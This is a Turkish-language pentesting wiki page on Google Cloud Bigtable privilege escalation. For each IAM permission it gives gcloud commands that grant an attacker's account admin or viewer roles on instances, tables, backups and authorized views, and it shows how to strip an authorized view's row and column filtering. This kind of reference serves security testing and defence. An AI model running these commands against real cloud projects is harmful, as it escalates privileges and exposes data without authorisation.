# GCP - Bigtable Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Bigtable hakkında daha fazla bilgi için bakın:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### `bigtable.instances.setIamPolicy`

**İzinler:** `bigtable.instances.setIamPolicy` (ve genellikle mevcut binding'leri okumak için `bigtable.instances.getIamPolicy`).

Örnek IAM politikasına sahip olmak, kendinize **`roles/bigtable.admin`** (veya herhangi bir özel rol) verme imkanı sağlar; bu, örnekteki her küme, tablo, yedekleme ve yetkili görünüme yayılır.

<details><summary>Örnekte kendinize bigtable.admin rolü verin</summary>
```bash
gcloud bigtable instances add-iam-policy-binding <instance-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

> [!TIP]
> Mevcut bindings'leri listeleyemiyorsanız, kendinizi dahil ettiğiniz sürece yeni bir policy belgesi hazırlayıp `gcloud bigtable instances set-iam-policy` ile gönderebilirsiniz.

Bu izne sahip olduktan sonra, Bigtable izinlerini kötüye kullanmanın daha fazla yolu için [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) tekniklerine bakın.

### `bigtable.tables.setIamPolicy`

**İzinler:** `bigtable.tables.setIamPolicy` (isteğe bağlı olarak `bigtable.tables.getIamPolicy`).

Instance politikaları kilitlenmiş olabilirken, bireysel tablolar devredilmiş olabilir. Tablo IAM'ını düzenleyebiliyorsanız, diğer iş yüklerine dokunmadan **kendinizi hedef veri kümesinin sahibi olarak yükseltebilirsiniz**.

<details><summary>Tablo üzerinde kendinize bigtable.admin rolü verin</summary>
```bash
gcloud bigtable tables add-iam-policy-binding <table-id> \
--instance=<instance-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

Bu izne sahip olduktan sonra, Bigtable izinlerini kötüye kullanmanın diğer yolları için [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) bölümündeki teknikleri kontrol edin.


### `bigtable.backups.setIamPolicy`

**İzinler:** `bigtable.backups.setIamPolicy`

Yedekler, kontrol ettiğiniz **herhangi bir projedeki herhangi bir instance'a** geri yüklenebilir. Önce kimliğinize yedek için erişim verin, sonra bunu Admin/Owner rollerine sahip olduğunuz bir sandbox içine geri yükleyin.

Eğer `bigtable.backups.setIamPolicy` iznine sahipseniz, kendinize `bigtable.backups.restore` iznini vererek eski yedekleri geri yükleyebilir ve hassas bilgilere erişmeyi deneyebilirsiniz.

<details><summary>Take ownership of backup snapshot</summary>
```bash
# Take ownership of the snapshot
gcloud bigtable backups add-iam-policy-binding <backup-id> \
--instance=<instance-id> --cluster=<cluster-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.admin'
```
</details>

Yedeği nasıl geri yükleyeceğinizi görmek için [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) içindeki bu izin kontrolünü yapın.


### Authorized view'i güncelle

**İzinler:** `bigtable.authorizedViews.update`

Authorized Views satırları/sütunları gizleyecek şekilde tasarlanmıştır. Bunları değiştirmek veya silmek, savunucuların güvendiği **ince taneli koruyucu önlemleri** ortadan kaldırır.

<details><summary>Erişimi genişletmek için authorized view'ü güncelle</summary>
```bash
# Broaden the subset by uploading a permissive definition
gcloud bigtable authorized-views update <view-id> \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/permissive-view.json --ignore-warnings

# Json example not filtering any row or column
cat <<'EOF' > /tmp/permissive-view.json
{
"subsetView": {
"rowPrefixes": [""],
"familySubsets": {
"<SOME FAMILITY NAME USED IN THE CURRENT TABLE>": {
"qualifierPrefixes": [""]
}
}
}
}
EOF

# Describe the authorized view to get a family name
gcloud bigtable authorized-views describe <view-id> \
--instance=<instance-id> --table=<table-id>
```
</details>

Bu izne sahip olduktan sonra, Authorized View'den nasıl okunacağını görmek için [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) bölümünü kontrol edin.

### `bigtable.authorizedViews.setIamPolicy`

**İzinler:**  `bigtable.authorizedViews.setIamPolicy`.

Bu izne sahip bir saldırgan kendisine Authorized View erişimi verebilir; bu görünüm, aksi takdirde erişimi olmayan hassas veriler içerebilir.

<details><summary>Kendinize Authorized View erişimi verin</summary>
```bash
# Give more permissions over an existing view
gcloud bigtable authorized-views add-iam-policy-binding <view-id> \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' \
--role='roles/bigtable.viewer'
```
</details>

Bu izin kontrolünü [**Bigtable Post Exploitation section**](../gcp-post-exploitation/gcp-bigtable-post-exploitation.md) bölümünde yaptıktan sonra, yetkilendirilmiş bir görünümden nasıl okunacağını görmek için bakın.



{{#include ../../../banners/hacktricks-training.md}}
